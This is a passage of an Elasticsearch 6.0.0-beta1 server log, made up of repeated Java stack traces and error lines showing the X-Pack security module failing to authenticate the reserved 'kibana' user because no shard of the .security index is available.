	at org.elasticsearch.client.FilterClient.doExecute(FilterClient.java:67) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.InternalClient.doExecute(InternalClient.java:86) ~[?:?]
	at org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:405) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.ActionRequestBuilder.execute(ActionRequestBuilder.java:71) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.esnative.NativeUsersStore.getReservedUserInfo(NativeUsersStore.java:553) ~[?:?]
	at org.elasticsearch.xpack.security.authc.esnative.ReservedRealm.getUserInfo(ReservedRealm.java:241) ~[?:?]
	at org.elasticsearch.xpack.security.authc.esnative.ReservedRealm.doAuthenticate(ReservedRealm.java:95) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.doAuthenticateAndCache(CachingUsernamePasswordRealm.java:170) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticateWithCache(CachingUsernamePasswordRealm.java:109) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticate(CachingUsernamePasswordRealm.java:94) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$13(AuthenticationService.java:284) ~[?:?]
	at org.elasticsearch.xpack.common.IteratingActionListener.run(IteratingActionListener.java:93) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeToken(AuthenticationService.java:320) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$extractToken$9(AuthenticationService.java:257) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.extractToken(AuthenticationService.java:266) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$null$0(AuthenticationService.java:201) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.TokenService.getAndValidateToken(TokenService.java:193) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:197) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$4(AuthenticationService.java:228) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:239) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:193) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:147) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:99) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.rest.SecurityRestFilter.handleRequest(SecurityRestFilter.java:69) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:240) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.tryAllHandlers(RestController.java:336) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:174) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.http.netty4.Netty4HttpServerTransport.dispatchRequest(Netty4HttpServerTransport.java:495) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:72) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:105) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at org.elasticsearch.http.netty4.pipelining.HttpPipeliningHandler.channelRead(HttpPipeliningHandler.java:63) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageCodec.channelRead(MessageToMessageCodec.java:111) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:310) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:284) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.ChannelInboundHandlerAdapter.channelRead(ChannelInboundHandlerAdapter.java:86) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1334) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:926) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:134) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:644) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:544) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:498) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:458) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:858) [netty-common-4.1.13.Final.jar:4.1.13.Final]
	at java.lang.Thread.run(Thread.java:745) [?:1.8.0_111]
[2017-08-01T09:22:22,120][ERROR][o.e.x.s.a.e.ReservedRealm] [d1S5k1-] failed to retrieve password hash for reserved user [kibana]
[2017-08-01T09:22:22,121][INFO ][o.e.x.s.a.AuthenticationService] [d1S5k1-] Authentication of [kibana] was terminated by realm [reserved] - failed to authenticate user [kibana]
[2017-08-01T09:22:22,147][INFO ][o.e.l.LicenseService     ] [d1S5k1-] license [59ac90a5-d43d-4ec8-b489-a185e91c91c4] mode [trial] - valid
[2017-08-01T09:22:22,165][INFO ][o.e.g.GatewayService     ] [d1S5k1-] recovered [11] indices into cluster_state
[2017-08-01T09:22:22,154][ERROR][o.e.x.s.a.e.NativeUsersStore] [d1S5k1-] failed to retrieve built in user [kibana] info
org.elasticsearch.action.NoShardAvailableActionException: No shard available for [get [.security][doc][reserved-user-kibana]: routing [null]]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.perform(TransportSingleShardAction.java:209) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.start(TransportSingleShardAction.java:186) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:95) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:59) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.doExecute(TransportAction.java:143) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:167) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$apply$0(SecurityActionFilter.java:104) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$authorizeRequest$3(SecurityActionFilter.java:178) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.maybeRun(AuthorizationUtils.java:124) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.setRunAsRoles(AuthorizationUtils.java:118) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.authorize(AuthorizationUtils.java:106) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:180) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$2(SecurityActionFilter.java:157) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:195) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$4(AuthenticationService.java:228) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:239) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:193) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:147) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:116) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:116) ~[?:?]
	at org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:165) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:139) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:81) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.node.NodeClient.executeLocally(NodeClient.java:83) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.node.NodeClient.doExecute(NodeClient.java:72) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:405) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.FilterClient.doExecute(FilterClient.java:67) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.InternalClient.doExecute(InternalClient.java:86) ~[?:?]
	at org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:405) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.ActionRequestBuilder.execute(ActionRequestBuilder.java:71) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.esnative.NativeUsersStore.getReservedUserInfo(NativeUsersStore.java:553) ~[?:?]
	at org.elasticsearch.xpack.security.authc.esnative.ReservedRealm.getUserInfo(ReservedRealm.java:241) ~[?:?]
	at org.elasticsearch.xpack.security.authc.esnative.ReservedRealm.doAuthenticate(ReservedRealm.java:95) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.doAuthenticateAndCache(CachingUsernamePasswordRealm.java:170) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticateWithCache(CachingUsernamePasswordRealm.java:109) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticate(CachingUsernamePasswordRealm.java:94) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$13(AuthenticationService.java:284) ~[?:?]
	at org.elasticsearch.xpack.common.IteratingActionListener.run(IteratingActionListener.java:93) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeToken(AuthenticationService.java:320) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$extractToken$9(AuthenticationService.java:257) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.extractToken(AuthenticationService.java:266) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$null$0(AuthenticationService.java:201) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.TokenService.getAndValidateToken(TokenService.java:193) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:197) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$4(AuthenticationService.java:228) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:239) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:193) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:147) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:99) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.rest.SecurityRestFilter.handleRequest(SecurityRestFilter.java:69) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:240) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.tryAllHandlers(RestController.java:336) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:174) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.http.netty4.Netty4HttpServerTransport.dispatchRequest(Netty4HttpServerTransport.java:495) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:72) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:105) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at org.elasticsearch.http.netty4.pipelining.HttpPipeliningHandler.channelRead(HttpPipeliningHandler.java:63) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageCodec.channelRead(MessageToMessageCodec.java:111) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:310) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:284) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.ChannelInboundHandlerAdapter.channelRead(ChannelInboundHandlerAdapter.java:86) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1334) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:926) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:134) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:644) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:544) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:498) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:458) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:858) [netty-common-4.1.13.Final.jar:4.1.13.Final]
	at java.lang.Thread.run(Thread.java:745) [?:1.8.0_111]
[2017-08-01T09:22:22,178][ERROR][o.e.x.s.a.e.ReservedRealm] [d1S5k1-] failed to retrieve password hash for reserved user [kibana]
[2017-08-01T09:22:22,178][INFO ][o.e.x.s.a.AuthenticationService] [d1S5k1-] Authentication of [kibana] was terminated by realm [reserved] - failed to authenticate user [kibana]
[2017-08-01T09:22:22,302][ERROR][o.e.x.s.a.e.NativeUsersStore] [d1S5k1-] failed to retrieve built in user [kibana] info
org.elasticsearch.action.NoShardAvailableActionException: No shard available for [get [.security][doc][reserved-user-kibana]: routing [null]]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.perform(TransportSingleShardAction.java:209) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.start(TransportSingleShardAction.java:186) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:95) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:59) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.doExecute(TransportAction.java:143) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:167) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$apply$0(SecurityActionFilter.java:104) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$authorizeRequest$3(SecurityActionFilter.java:178) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.maybeRun(AuthorizationUtils.java:124) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.setRunAsRoles(AuthorizationUtils.java:118) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.authorize(AuthorizationUtils.java:106) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:180) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$2(SecurityActionFilter.java:157) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:195) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$4(AuthenticationService.java:228) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:239) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:193) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:147) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:116) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:116) ~[?:?]
	at org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:165) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
